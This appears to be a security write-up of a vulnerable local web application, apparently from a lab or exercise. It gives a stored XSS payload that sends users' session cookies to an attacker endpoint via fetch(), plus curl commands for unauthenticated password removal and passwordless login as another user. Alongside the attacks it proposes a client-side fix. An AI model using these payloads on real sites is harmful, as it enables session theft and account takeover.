# WRITEUP

## Reflective XSS

Da die Posts nicht sanitisiert werden, können wir mittels Reflective XSS Code einschleusen. Dieser wird dann beim Anzeigen des Posts ausgeführt.

Da React `script`-Tags nicht ausführt, können wir z.B. einen `img`-Tag verwenden.

Session erstellen:

```bash
curl 'http://localhost:8080/login' -s -c - -X POST -H 'Content-Type: application/json' --data-raw '{"username":"alice","password":"always"}' | sed -En 's/^.+session-id[\s\t]+([0-9a-z\-]+)$/session-id=\1/gp'
```

Post mit XSS-Payload erstellen:

```bash
curl 'http://localhost:8080/posts/6203' -X PUT -H 'Cookie: session-id=1' -H 'Content-Type: application/json' --data-raw $'{"title":"Test","content":"<img style=\\"opacity: 0;\\" onerror=\\"fetch(\'http://localhost:9090/stealcookie?\' + new URLSearchParams(document.cookie).toString())\\" src=\\"1\\" />"}'
```

As soon as another user fetches the posts, their session-id cookie is sent to the evil backend.

### Proposed solution

Change the client from using `innerHTML` to `innerText`.

```patch
--- client.js        2025-01-21 10:04:12.944756419 +0100
+++ client.js   2025-01-21 10:01:58.209460306 +0100
@@ -75,7 +75,7 @@
 
 function createElementWithText(tagName, text, cssClass = undefined) {
     const newElement = document.createElement(tagName);
-    newElement.innerHTML = text;
+    newElement.innerText = text;
 
     if (cssClass) newElement.className = cssClass;
     return newElement;
```

## Disable any account

We can disable any account without authorization, due to a flaw in the application that just deletes the password from the "database".

```bash
curl 'http://localhost:8080/users/bob' -X PATCH -H 'Content-Type: application/json' --data-raw $'{"password":"admin"}'
```

Now, Bob cannot log in anymore. Bob is sad.

Taking this further, now we can just log in as Bob by not sending a password to the login endpoint:

```bash
curl 'http://localhost:8080/login' -s -c - -X POST -H 'Content-Type: application/json' --data-raw '{"username":"bob"}' | sed -En 's/^.+session-id[\s\t]+([0-9]+)$/session-id=\1/gp'
```

Now, Bob is not sad anymore - because we are Bob.

## The obvious - Session ID should not be incremental

Come on, the session id is just a number. We can just subtract one from our session id and we are logged in as another user. There isn't even something to demonstrate here, because it's so simple.

## Passwords should be hashed

Nothing more needs to be said.

## Current user should not be stored globally

What even is this?

## Packages are out-of-date
